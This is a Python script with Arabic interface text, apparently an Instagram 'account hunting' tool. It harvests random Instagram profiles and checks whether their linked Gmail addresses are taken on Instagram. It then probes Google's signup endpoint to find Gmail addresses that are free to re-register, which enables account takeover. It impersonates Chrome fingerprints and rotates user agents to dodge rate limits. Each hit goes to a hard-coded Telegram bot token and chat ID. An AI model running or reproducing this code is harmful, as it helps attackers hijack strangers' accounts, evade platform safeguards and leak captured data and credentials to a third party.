import os
import sys
import re
import json
import random
import secrets
import time
import gzip
import string
from datetime import datetime
from threading import Thread, Lock

# ---------- curl_cffi (لمحاكاة بصمة Chrome) ----------
try:
    from curl_cffi import requests as crequests
    CURL_CFFI_AVAILABLE = True
except ImportError:
    import requests as crequests
    CURL_CFFI_AVAILABLE = False
    print("\033[93m⚠️  curl_cffi غير مثبت - الأداء سيكون أضعف\033[0m")

import requests
from user_agent import generate_user_agent
from colorama import init
from rich.table import Table
from rich.console import Console

# ---------- حقوق النشر ----------
# [ Dev: @zizfif | Channel: @yy_100k ]
# ---------------------------------

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
GR = '\033[90m'
RS = '\033[0m'
init(autoreset=True)

console = Console()

# ---------- التوكن والـ ID (ثابتان) ----------
TOKEN = "8910699357:AAFkqVCYsZSu85qepp0-T1QmsIPLylNrRzY"
ID = "231834994"

# ---------- متغيرات عامة ----------
hits = 0
bad_email = 0
bad_insta = 0
good_ig = 0
infoinsta = {}
results_list = []
rate_limit_hits = 0

stats_lock = Lock()

_session = requests.Session()


def http_post(url, headers=None, data=None, cookies=None, params=None, timeout=10):
    try:
        if CURL_CFFI_AVAILABLE:
            return crequests.post(
                url, headers=headers, data=data, cookies=cookies,
                params=params, timeout=timeout, impersonate="chrome120"
            )
        else:
            return _session.post(
                url, headers=headers, data=data, cookies=cookies,
                params=params, timeout=timeout
            )
    except Exception:
        raise


def http_get(url, headers=None, cookies=None, timeout=10):
    try:
        if CURL_CFFI_AVAILABLE:
            return crequests.get(
                url, headers=headers, cookies=cookies,
                timeout=timeout, impersonate="chrome120"
            )
        else:
            return _session.get(
                url, headers=headers, cookies=cookies, timeout=timeout
            )
    except Exception:
        raise


def display_results_table():
    if not results_list:
        return
    table = Table(title="نتائج الصــيد", style="cyan")
    table.add_column("البريد الإلكتروني", style="green", no_wrap=True)
    table.add_column("الحالة", style="yellow")
    table.add_column("ملاحظة", style="white")
    for email, status, note in results_list[-15:]:
        status_icon = "✅ ناجح" if status == "good" else "❌ فاشل"
        table.add_row(email, status_icon, note)
    console.print(table)


def update_stats():
    with stats_lock:
        os.system('cls' if os.name == 'nt' else 'clear')
        stats = f"""
{GR}-------------------------------------------------------------------{RS}
{Y} — STATISTICS{RS}
{GR}-------------------------------------------------------------------{RS}
{G}Hits       : {hits}{RS}
{R}Bad gmail  : {bad_email}{RS}
{R}Bad Insta  : {bad_insta}{RS}
{G}Good Insta : {good_ig}{RS}
{Y}Rate Limit : {rate_limit_hits}{RS}
{GR}-------------------------------------------------------------------{RS}
 — @zizfif | ♱ Tools | : @yy_100k • Python3 Tools
{GR}-------------------------------------------------------------------{RS}
"""
        print(stats)
        display_results_table()
        print(f"\n{GR}[ Dev: @zizfif | Channel: @yy_100k ]{RS}\n")


TOKEN_FILE = 'DANTE.txt'
instatool_domain = '@gmail.com'

_csrf_token = None


def init_instagram_session():
    global _csrf_token
    try:
        r = requests.get(
            'https://www.instagram.com/accounts/signup/email/',
            headers={'User-Agent': generate_user_agent()},
            timeout=10
        )
        match = re.search(r'"csrf_token":"(.*?)"', r.text)
        if match:
            _csrf_token = match.group(1)
            print(f"{G}✓ تم جلب CSRF token بنجاح{RS}")
            return _csrf_token
    except Exception as e:
        print(f"{Y}⚠️  تعذر جلب CSRF: {e}{RS}")
    _csrf_token = secrets.token_hex(16)
    return _csrf_token


def check_instagram_email(mail):
    global rate_limit_hits
    try:
        url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
        headers = {
            'X-Csrftoken': _csrf_token or secrets.token_hex(16),
            'User-Agent': generate_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/signup/email/',
        }
        data = {'email': mail}
        res = http_post(url, headers=headers, data=data, timeout=10)

        if res.status_code == 429:
            with stats_lock:
                rate_limit_hits += 1
            return None
        if res.status_code != 200:
            return False
        return "email_is_taken" in res.text
    except Exception:
        return False


def instatool():
    while True:
        try:
            alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
            n1 = ''.join(random.choice(alphabet) for _ in range(random.randrange(6, 9)))
            n2 = ''.join(random.choice(alphabet) for _ in range(random.randrange(3, 9)))
            host = ''.join(random.choice(alphabet) for _ in range(random.randrange(15, 30)))
            headers = {
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'User-Agent': generate_user_agent()
            }
            recovery_url = ("https://accounts.google.com/signin/v2/usernamerecovery"
                            "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
            res1 = http_get(recovery_url, headers=headers, timeout=10)

            match = re.search(
                'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            )
            if not match:
                time.sleep(2)
                continue

            tok = match.group(2)
            cookies = {'__Host-GAPS': host}
            headers2 = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
                'User-Agent': generate_user_agent()
            }
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                               'null,0,1,"",null,null,2,2]')
            }
            response = http_post(
                "https://accounts.google.com/_/signup/validatepersonaldetails",
                cookies=cookies, headers=headers2, data=data, timeout=10
            )
            token_line = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict().get('__Host-GAPS', host)
            with open(TOKEN_FILE, 'w') as f:
                f.write(f"{token_line}//{host}\n")
            print(f"{G}✓ تم تجهيز Google token{RS}")
            return
        except Exception as e:
            print(f"{Y}⚠️  instatool: {e} - إعادة محاولة...{RS}")
            time.sleep(2)


def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            'User-Agent': generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = http_post(
            "https://accounts.google.com/_/signup/usernameavailability",
            params=params, cookies=cookies, headers=headers, data=data, timeout=10
        )
        if '"gf.uar",1' in response.text:
            with stats_lock:
                hits += 1
            update_stats()
            full_email = email + instatool_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            with stats_lock:
                bad_email += 1
            update_stats()
    except Exception:
        pass


def check(email):
    global good_ig, bad_insta, results_list
    try:
        email_exists = check_instagram_email(email)

        if email_exists is None:
            time.sleep(random.uniform(8, 15))
            return

        if email_exists:
            if instatool_domain in email:
                check_gmail(email)
            with stats_lock:
                good_ig += 1
                results_list.append((email, "good", "صالح"))
            update_stats()
        else:
            with stats_lock:
                bad_insta += 1
                results_list.append((email, "bad", "غير صالح"))
            update_stats()
    except Exception as e:
        with stats_lock:
            bad_insta += 1
            results_list.append((email, "bad", f"خطأ: {str(e)[:30]}"))
        update_stats()
        err = str(e).lower()
        if any(x in err for x in ["auth_key_duplicated", "flood_wait", "rate_limit", "feedback_required"]):
            console.print(f"\n{R}⚠️  تم اكتشاف حظر جغرافي - غيّر الـ VPN{RS}")


def InfoAcc(username, domain):
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk', 'Unknown')
    full_name = account_info.get('full_name', 'Unknown')
    followers = account_info.get('follower_count', 0)
    following = account_info.get('following_count', 0)
    posts = account_info.get('media_count', 0)
    is_private = account_info.get('is_private', False)
    is_verified = account_info.get('is_verified', False)
    created_ts = account_info.get('account_created_at')
    created_year = datetime.fromtimestamp(created_ts).year if created_ts else "2015"

    email = f"{username}@{domain}"
    obfus_email = f"{username[0]}***@{domain}" if username else email

    html_msg = f"""
<b>⦿ Instagram </b>
━━━━━━━━ 𓆩VIP𓆪 ━━━━━━━━
◉<b> Username:</b> @{username}
◉<b> Name:</b> {full_name}
◉<b> ID:</b> {user_id}
◉<b> Followers:</b> {followers}
◉<b> Following:</b> {following}
◉<b> Posts:</b> {posts}
◉<b> Private:</b> {is_private}
◉<b> Verified:</b> {is_verified}
◉<b> Date:</b> {created_year}
◉<b> Email:</b> {email}
◉<b> Rest:</b> {obfus_email}
◉<b> Profile:</b> https://www.instagram.com/{username}
━━━━━━━━ 𓆩VIP𓆪 ━━━━━━━━
➥ X: @yy_100k | ♱ Tools
"""
    plain = f"""
⦿ Instagram 
━━━━━━━━ 𓆩VIP𓆪 ━━━━━━━━
◉ Username: @{username}
◉ Name: {full_name}
◉ ID: {user_id}
◉ Followers: {followers}
◉ Following: {following}
◉ Posts: {posts}
◉ Private: {is_private}
◉ Verified: {is_verified}
◉ Date: {created_year}
◉ Email: {email}
◉ Rest: {obfus_email}
━━━━━━━━ 𓆩VIP𓆪 ━━━━━━━━
➥ X: @yy_100k | ♱ Tools
"""
    with open('DANTE_Hits.txt', 'a', encoding='utf-8') as f:
        f.write(plain + "\n")
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            data={"chat_id": ID, "text": html_msg, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception:
        pass


def instatoolpy():
    global rate_limit_hits
    while True:
        try:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(3713668786, 21254029834)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            headers = {'X-FB-LSD': data['lsd']}
            response = http_post(
                'https://www.instagram.com/api/graphql',
                headers=headers, data=data, timeout=10
            )

            if response.status_code == 429:
                with stats_lock:
                    rate_limit_hits += 1
                update_stats()
                time.sleep(random.uniform(6, 12))
                continue
            elif response.status_code != 200:
                time.sleep(2)
                continue

            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                infoinsta[username] = account
                check(username + instatool_domain)

            time.sleep(random.uniform(1.0, 2.5))
        except Exception:
            time.sleep(2)


if __name__ == "__main__":
    print(f"""
{Y}═══════════════════════════════════════════════════════{RS}
{G}         أداة صــيد حسابات Instagram{RS}
{Y}═══════════════════════════════════════════════════════{RS}
{G}  curl_cffi: {'✓ مُثبّت - بصمة Chrome مفعّلة' if CURL_CFFI_AVAILABLE else '✗ غير مُثبّت - ثبّته للأداء الأفضل'}{RS}
{Y}═══════════════════════════════════════════════════════{RS}
{GR}  [ Dev: @zizfif | Channel: @yy_100k ]{RS}
{Y}═══════════════════════════════════════════════════════{RS}
""")

    init_instagram_session()
    print()

    instatool()
    print()

    print(f"{G}✓ التوكن والـ ID مثبتان مسبقاً{RS}\n")

    update_stats()

    print(f"{G}🚀 بدء الصيد بـ 5 خيوط (معدل آمن)...{RS}\n")
    time.sleep(1)

    THREADS_COUNT = 5
    for _ in range(THREADS_COUNT):
        Thread(target=instatoolpy, daemon=True).start()

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print(f"\n{R}⏹ تم إيقاف الأداة{RS}")
        sys.exit(0)
